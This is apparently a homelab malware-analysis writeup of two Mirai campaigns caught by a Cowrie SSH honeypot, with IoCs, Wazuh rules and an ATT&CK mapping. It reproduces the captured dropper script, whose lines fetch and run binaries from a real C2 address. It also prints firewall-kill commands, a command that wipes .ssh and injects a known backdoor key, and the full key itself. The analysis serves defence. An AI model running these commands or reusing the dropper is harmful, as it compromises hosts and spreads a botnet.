# Mirai Botnet Dropper & SSH Persistence Campaign — Captured Artifact Analysis

**Document ID:** NINGI-WRITEUP-004
**Date:** 2026-03-13
**Category:** Malware Analysis / Threat Intelligence
**Environment:** fuji-mailbox VPS — Cowrie 2.x / Wazuh 4.14.0
**Severity:** High

---

## Overview

This writeup documents two concurrent campaigns I captured with the Cowrie SSH honeypot between 2026-03-06 and 2026-03-13, with real malware artefacts recovered from the Cowrie downloads directory. The first campaign deployed a multi-architecture Mirai botnet dropper (`sshbins.sh`) sourced from attacker-controlled infrastructure. The second injected a well-known Mirai SSH backdoor key into `authorized_keys` across multiple user accounts. Based on the recovered IoCs, I assess both campaigns with high confidence as Mirai family variants.

This writeup includes analysis of actual captured malware: `sshbins.sh` (SHA-256: `87962f...`) and an SSH public key (SHA-256: `a8460f...`), both recovered from the Cowrie honeypot filesystem.

---

## Dataset Context

| Metric | Value |
|---|---|
| Observation period | 2026-02-27 — 2026-03-13 |
| Total connection attempts | 139,164 |
| Successful logins | 6,531 |
| Commands executed | 18,756 |
| File downloads captured | 10 |
| File uploads captured | 25 |
| Unique attacker IPs (top 20 only) | 147,240 events from single top IP |

---

## Campaign 1 — Mirai Multi-Architecture Dropper (sshbins.sh)

### Attack Chain

```
00:58 — Credential spray begins (185.242.3.105)
        SSH-2.0-Go client, HASSH: 16443846184eafde36765c9bab2f4397
        Tests: HONEYYYFAGGOT, root/crypto, root/miner, root/cryptominer...
        
00:59 — root/root succeeds → session closes immediately (beaconing)

02:33 — Returns with payload delivery session
        pkill iptables -9; pkill firewalld -9
        cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
        curl -o sshbins.sh http://88.214.20.14/sshbins.sh
        → sshbins.sh downloaded and captured by Cowrie

03:23, 03:44, 04:23 — Returns hourly, replays identical command
        (C2 retry loop — confirms persistent campaign infrastructure)
```

### Attacker Profile

| Attribute | Value |
|---|---|
| Source IP | `185.242.3.105` |
| SSH client | `SSH-2.0-Go` (custom Go-based scanner) |
| HASSH fingerprint | `16443846184eafde36765c9bab2f4397` |
| C2 infrastructure | `88.214.20.14` |
| Credential used | `root/root` |
| Session pattern | Hourly retry loop |

**Notable:** The attacker's credential list included `HONEYYYFAGGOT/HONNEYPOT-FAG-GO-FUCK-YOURSELF-SKID` as an early attempt — a deliberate honeypot taunt. This confirms the attacker is aware they hit honeypot infrastructure and continues anyway, either to test payloads against detection systems or because the volume of real targets makes honeypot hits acceptable noise.

### Captured Artifact — sshbins.sh

**SHA-256:** `87962f5746b0bdafa17d4c9abfbb3fc95b61766e742c80782624e2d9f0be545a`  
**Source URL:** `http://88.214.20.14/sshbins.sh`  
**Captured:** 2026-03-13T02:33:10Z

```sh
#!/bin/sh
wget -q http://88.214.20.14/bins/tux.x86 -O tux.x86 && chmod +x tux.x86 && ./tux.x86 ssh
wget -q http://88.214.20.14/bins/tux.mips -O tux.mips && chmod +x tux.mips && ./tux.mips ssh
wget -q http://88.214.20.14/bins/tux.mpsl -O tux.mpsl && chmod +x tux.mpsl && ./tux.mpsl ssh
wget -q http://88.214.20.14/bins/tux.arm -O tux.arm && chmod +x tux.arm && ./tux.arm ssh
wget -q http://88.214.20.14/bins/tux.arc -O tux.arc && chmod +x tux.arc && ./tux.arc ssh
wget -q http://88.214.20.14/bins/tux.arm4 -O tux.arm4 && chmod +x tux.arm4 && ./tux.arm4 ssh
wget -q http://88.214.20.14/bins/tux.arm5 -O tux.arm5 && chmod +x tux.arm5 && ./tux.arm5 ssh
wget -q http://88.214.20.14/bins/tux.arm6 -O tux.arm6 && chmod +x tux.arm6 && ./tux.arm6 ssh
wget -q http://88.214.20.14/bins/tux.arm7 -O tux.arm7 && chmod +x tux.arm7 && ./tux.arm7 ssh
wget -q http://88.214.20.14/bins/tux.ppc -O tux.ppc && chmod +x tux.ppc && ./tux.ppc ssh
wget -q http://88.214.20.14/bins/tux.m68k -O tux.m68k && chmod +x tux.m68k && ./tux.m68k ssh
wget -q http://88.214.20.14/bins/tux.sh4 -O tux.sh4 && chmod +x tux.sh4 && ./tux.sh4 ssh
curl -o tux.86 http://88.214.20.14/bins/tux.x86 && chmod +x tux.x86 && ./tux.x86 ssh
[... curl fallbacks for all 12 architectures ...]
```

### Script Analysis

**Defense evasion — firewall kill:**
```bash
pkill iptables -9; pkill firewalld -9
```
The first action before any download is killing both `iptables` and `firewalld` processes. This disables host-based firewalling to ensure the implant can communicate outbound freely. `pkill -9` sends SIGKILL — no graceful shutdown, no cleanup scripts run.

**Working directory fallback chain:**
```bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
```
A resilience pattern — tries five directories in order of preference. `/tmp` is the primary target (world-writable, no mount restrictions on most systems). Falls back through `/var/run`, `/mnt`, `/root`, and finally `/` if all else fails. Ensures the script can always write the downloaded binaries somewhere.

**Multi-architecture shotgun deployment:**

The script downloads and attempts to execute 12 binary variants simultaneously:

| Binary | Architecture | Target devices |
|---|---|---|
| `tux.x86` | x86 32-bit | Standard Linux servers, VMs |
| `tux.mips` | MIPS big-endian | Routers, embedded (Cisco, Juniper) |
| `tux.mpsl` | MIPS little-endian | Routers (D-Link, TP-Link) |
| `tux.arm` | ARM generic | Raspberry Pi, IoT, Android |
| `tux.arm4/5/6/7` | ARM variants | Specific SoC generations |
| `tux.arc` | ARC processor | Synopsys embedded SoCs |
| `tux.ppc` | PowerPC | Older routers, NAS devices |
| `tux.m68k` | Motorola 68k | Legacy embedded systems |
| `tux.sh4` | SuperH SH-4 | Sega Dreamcast SoC, some routers |

Rather than checking architecture first and downloading only the matching binary, the script fires all 12 and lets the OS reject incompatible formats. Only the correct architecture binary executes successfully. This is a reliability optimisation — no recon required, no architecture detection step that could fail.

**wget + curl dual-delivery:**
Every binary has a `wget` attempt followed by a `curl` fallback — identical to the defence evasion pattern seen in the command execution layer. If one download tool is absent or blocked, the other takes over.

**The `ssh` argument:**
Every binary is invoked with `ssh` as the sole argument: `./tux.x86 ssh`. This argument likely instructs the implant to run in SSH spreading mode — scanning for and attacking other SSH servers, propagating the botnet.

**Naming convention — "tux":**
The Linux mascot name is a known naming pattern in Mirai source code forks. Mirai's original source code (leaked in 2016) used similar naming conventions for cross-compiled binaries targeting embedded Linux devices.

---

## Campaign 2 — SSH Authorized Key Injection (mdrfckr)

### Captured Artifact — SSH Public Key

**SHA-256:** `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2`  
**Destination paths targeted:** `/root/.ssh/authorized_keys`, `/home/ubuntu/.ssh/authorized_keys`, `/home/admin/.ssh/authorized_keys`

```
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fc
BOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBH
pgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQ
Hmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYY
jIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
```

**The `mdrfckr` key comment is a well-documented Mirai botnet IoC.** This exact public key has appeared in honeypot captures globally and is directly associated with Mirai variants that maintain SSH backdoor persistence on compromised hosts. Any system with this key in `authorized_keys` is owned by the Mirai operator and accessible via the corresponding private key.

### Injection Campaign Timeline

| Date | Source IP | Target path |
|---|---|---|
| 2026-03-06 | `93.93.202.165` | `/root/.ssh/authorized_keys` |
| 2026-03-08 | `160.187.100.39` | `/home/ubuntu/.ssh/authorized_keys` |
| 2026-03-08 | `139.59.66.22` | `/home/ubuntu/.ssh/authorized_keys` |
| 2026-03-09 | `51.161.153.48` | `/root/.ssh/authorized_keys` |
| 2026-03-09 | `160.187.54.87` | `/root/.ssh/authorized_keys` |
| 2026-03-09 | `125.21.53.232` | `/home/ubuntu/.ssh/authorized_keys` |
| 2026-03-10 | `116.111.2.94` | `/home/admin/.ssh/authorized_keys` |

Seven distinct source IPs injecting the **identical key** over five days. The same SHA-256 hash across all events confirms a single coordinated campaign with centrally managed infrastructure — one operator, multiple compromised launch nodes.

The Cowrie log marks events 2–7 as `"duplicate": true` — Cowrie recognises the same file content has been seen before. The first injection (March 6) was novel; subsequent ones are repeat attempts from different IPs.

### Injection Command

From the top 20 commands across the full dataset:

```bash
cd ~; chattr -ia .ssh; lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAr..." >> .ssh/authorized_keys
```

**Step 1 — `chattr -ia .ssh`:** Removes immutable (`i`) and append-only (`a`) extended attributes from the `.ssh` directory. This is targeted specifically at hardened systems where administrators have used `chattr` to prevent modification of `authorized_keys`. The attacker anticipates this defence and removes it before proceeding.

**Step 2 — `rm -rf .ssh && mkdir .ssh`:** Wipes the entire `.ssh` directory and recreates it fresh. This removes any existing `authorized_keys` entries (including legitimate admin keys) and ensures only the attacker's key is present — a lockout technique.

**Step 3 — `echo "ssh-rsa..." >> .ssh/authorized_keys`:** Injects the mdrfckr backdoor key.

---

## Additional Attacker Behaviour

### MikroTik Targeting

From the top 20 commands:
```
/ip cloud print
```
This is a **RouterOS command** — the operating system for MikroTik network devices. Its presence in honeypot sessions indicates some attackers are probing for MikroTik devices, either misidentifying the honeypot as RouterOS or running scripts that test for both Linux and RouterOS targets in sequence.

### NVIDIA GPU Targeting

```bash
uname -a && nproc && (nvidia-smi --list-gpus | grep 0 | cut -f2 -d: | uniq -c || true)
nvidia-smi --list-gpus | grep 0 | cut -f2 -d: | uniq -c
```
Observed 110 times — a distinct campaign specifically enumerating NVIDIA GPUs. `nvidia-smi` is the NVIDIA System Management Interface CLI. Presence of a GPU dramatically increases value for a cryptomining payload. This command sequence appears independently of the advanced recon script documented in WRITEUP-003, suggesting a separate campaign with the same targeting objective.

### Top Attacker — 193.32.162.188

This single IP generated **147,240 events** — more than the next four attackers combined. At that volume across the ~14-day observation period, this represents approximately 10,500 connection attempts per day, or roughly 7 per minute continuously. This is consistent with an aggressive automated scanner rather than a human operator. The sheer volume from a single IP warrants dedicated analysis in a future writeup.

---

## Indicators of Compromise

| Type | Value | Campaign |
|---|---|---|
| IP | `185.242.3.105` | Mirai dropper delivery |
| IP | `88.214.20.14` | C2 / payload hosting |
| URL | `http://88.214.20.14/sshbins.sh` | Dropper script |
| URL | `http://88.214.20.14/bins/tux.*` | Multi-arch binaries |
| SHA-256 | `87962f5746b0bdafa17d4c9abfbb3fc95b61766e742c80782624e2d9f0be545a` | sshbins.sh |
| SHA-256 | `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | mdrfckr SSH key |
| SSH key comment | `mdrfckr` | Known Mirai IoC |
| HASSH | `16443846184eafde36765c9bab2f4397` | 185.242.3.105 scanner |
| IPs (key injection) | `93.93.202.165`, `160.187.100.39`, `139.59.66.22`, `51.161.153.48`, `160.187.54.87`, `125.21.53.232`, `116.111.2.94` | mdrfckr campaign |

---

## Detection Rules

```xml
<!-- Firewall kill before payload delivery -->
<rule id="100109" level="15">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>pkill iptables</match>
  <description>Cowrie: Attacker killed iptables — imminent payload delivery</description>
  <group>cowrie,defense_evasion,mirai,</group>
</rule>

<!-- Multi-arch dropper pattern -->
<rule id="100110" level="14">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>sshbins\|tux\.x86\|tux\.mips\|tux\.arm</match>
  <description>Cowrie: Mirai-style multi-architecture dropper detected</description>
  <group>cowrie,malware,mirai,</group>
</rule>

<!-- SSH authorized_keys wipe and replace -->
<rule id="100111" level="15">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>rm -rf .ssh.*authorized_keys\|chattr -ia .ssh</match>
  <description>Cowrie: SSH backdoor persistence — authorized_keys injection attempt</description>
  <group>cowrie,persistence,mirai,</group>
</rule>

<!-- mdrfckr key IoC -->
<rule id="100112" level="15">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>mdrfckr\|AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4</match>
  <description>Cowrie: Known Mirai mdrfckr SSH backdoor key detected</description>
  <group>cowrie,persistence,mirai,ioc,</group>
</rule>
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Observed |
|---|---|---|
| Valid Accounts: Default Accounts | T1078.001 | root/root credential spray |
| Impair Defenses: Disable or Modify Tools | T1562.001 | `pkill iptables -9; pkill firewalld -9` |
| Ingress Tool Transfer | T1105 | `curl/wget sshbins.sh` and tux.* binaries |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Shell dropper execution |
| Account Manipulation: SSH Authorized Keys | T1098.004 | mdrfckr key injection to authorized_keys |
| File and Directory Permissions Modification | T1222.002 | `chattr -ia .ssh` to remove immutable flag |
| Resource Hijacking | T1496 | `ssh` argument to tux binaries — SSH spreading |
| Exploit Public-Facing Application | T1190 | SSH brute force as initial access vector |

---

## Lessons Learned

- **Real malware is capturable.** Cowrie's download proxy captured `sshbins.sh` intact, providing a complete view of the dropper script without running it. Enabling Cowrie's download proxy is high-value for threat intelligence collection.
- **The mdrfckr key is a high-confidence Mirai IoC.** Any `authorized_keys` file containing this key should be treated as a confirmed compromise indicator. Defenders can grep for it directly: `grep -r "mdrfckr" /home/*/.ssh/ /root/.ssh/`.
- **Attackers know about honeypots and don't care.** The deliberate honeypot taunt in the credential list confirms awareness — at scale, even honeypot sessions are worth running through the payload delivery pipeline.
- **`chattr` is a target, not just a defence.** Immutable `.ssh` directories are known to attackers. Defence-in-depth requires more than a single `chattr` flag — auditd monitoring on SSH directory modification provides earlier warning.
- **Hourly C2 retry loops are detectable.** The 185.242.3.105 sessions at 02:33, 03:23, 03:44, and 04:23 are a reliable detection pattern — the same command from the same IP on a regular interval. A Wazuh frequency rule could flag this automatically.

---

*Everything in this writeup comes from real attack traffic captured by my Cowrie honeypot between 2026-02-27 and 2026-03-13.*  
*I documented it as part of the homelab research project.*
